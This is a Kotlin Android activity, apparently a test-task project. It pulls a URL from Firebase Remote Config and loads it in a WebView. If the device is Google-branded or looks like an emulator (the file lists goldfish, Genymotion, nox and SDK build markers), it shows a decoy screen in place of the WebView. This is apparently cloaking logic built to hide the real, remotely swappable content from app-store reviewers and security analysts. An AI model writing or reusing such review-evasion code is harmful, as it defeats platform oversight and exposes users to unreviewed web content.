package com.example.testtasck

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.ConnectivityManager
import android.net.NetworkInfo
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.remoteconfig.BuildConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings
import java.util.Locale

class MainActivity : AppCompatActivity() {

    private lateinit var mFirebaseRemoteConfig: FirebaseRemoteConfig
    private lateinit var sharedPrefs: SharedPreferences

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)


        // Проверяем доступность сети
        if (isNetworkAvailable()) {
            initializeFirebaseRemoteConfig()
        } else {
            // Интернет недоступен, переходим к экрану без интернета
            startActivity(Intent(this, NoInternetActivity::class.java))
            finish()
        }

        // Инициализация SharedPreferences
        sharedPrefs = getSharedPreferences("MyAppPrefs", Context.MODE_PRIVATE)

        val savedUrl = sharedPrefs.getString("savedUrl", "")

        if (savedUrl.isNullOrEmpty()) {
            processRemoteConfigData()
            // Если сохраненная ссылка отсутствует или пустая
            Log.d("MainActivity", "ссылка пустая")

        } else {
            openWebViewActivity()
        }
    }

    private fun initializeFirebaseRemoteConfig() {
        mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance()
        val configSettings = FirebaseRemoteConfigSettings.Builder()
            .setMinimumFetchIntervalInSeconds(1)
            .build()
        mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings)
    }

    private fun processRemoteConfigData() {
        try {
            // Выполняем запрос на получение данных
            mFirebaseRemoteConfig.fetchAndActivate()
                .addOnCompleteListener(this) { task ->
                    if (task.isSuccessful) {
                        val url = mFirebaseRemoteConfig.getString("url")
                        Log.d("MainActivity", "Значение URL из Remote Config: $url")

                        if (url.isEmpty() || isGoogleDevice() || isEmulator()) {
                            openAnotherActivity()
                            Log.d(
                                "MainActivity",
                                "прошла условие Значение URL из Remote Config: $url"
                            )
                        } else {
                            Log.d(
                                "MainActivity",
                                "зашел"
                            )
                            with(sharedPrefs.edit()) {
                                putString("savedUrl", url)
                                apply()
                            }
                            openWebViewActivity()
                        }
                    } else {
                        handleFetchFailure()
                    }
                }
        } catch (e: Exception) {
            handleFetchFailure()
        }
    }

    private fun openAnotherActivity() {
        val intent = Intent(this@MainActivity, AnotherActivity::class.java)
        startActivity(intent)
        Log.d("MainActivity", " открываем AnotherActivity")
    }

    private fun openWebViewActivity() {
        val intent = Intent(this@MainActivity, WebViewActivity::class.java)
        startActivity(intent)
        Log.d("MainActivity", "Первый запуск приложения, открываем AnotherActivity")
    }


    private fun handleFetchFailure() {
        showToast("Failed to fetch data. Please check your network connection.")
        showErrorScreenWithMessage("Failed to fetch data. Please check your network connection.")
        Log.e("MainActivity", "Error while fetching data from Firebase Remote Config")
    }

    private fun showToast(message: String) {
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
    }

    private fun isNetworkAvailable(): Boolean {
        val connectivityManager =
            getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val networkInfo: NetworkInfo? = connectivityManager.activeNetworkInfo
        return networkInfo?.isConnectedOrConnecting == true
    }

    private fun showErrorScreenWithMessage(errorMessage: String) {
        val errorIntent = Intent(this, NoInternetActivity::class.java)
        errorIntent.putExtra("message", errorMessage)
        startActivity(errorIntent)
    }

    private fun isGoogleDevice(): Boolean {
        return Build.BRAND.equals("google", ignoreCase = true)
    }


    private fun isEmulator(): Boolean {
        if (BuildConfig.DEBUG) return false

        val phoneModel = Build.MODEL
        val buildProduct = Build.PRODUCT
        val buildHardware = Build.HARDWARE
        val brand = Build.BRAND

        val result = (Build.FINGERPRINT.startsWith("generic") ||
                phoneModel.contains("google_sdk") ||
                phoneModel.contains("Emulator") ||
                phoneModel.contains("Android SDK built for x86") ||
                Build.MANUFACTURER.contains("Genymotion") ||
                buildHardware == "goldfish" ||
                brand.contains("google") ||
                buildHardware == "vbox86" ||
                buildProduct == "sdk" ||
                buildProduct == "google_sdk" ||
                buildProduct == "sdk_x86" ||
                buildProduct == "vbox86p" ||
                Build.BOARD.contains("nox") ||
                Build.BOOTLOADER.contains("nox") ||
                buildHardware.contains("nox") ||
                buildProduct.contains("nox"))

        return result
    }


}
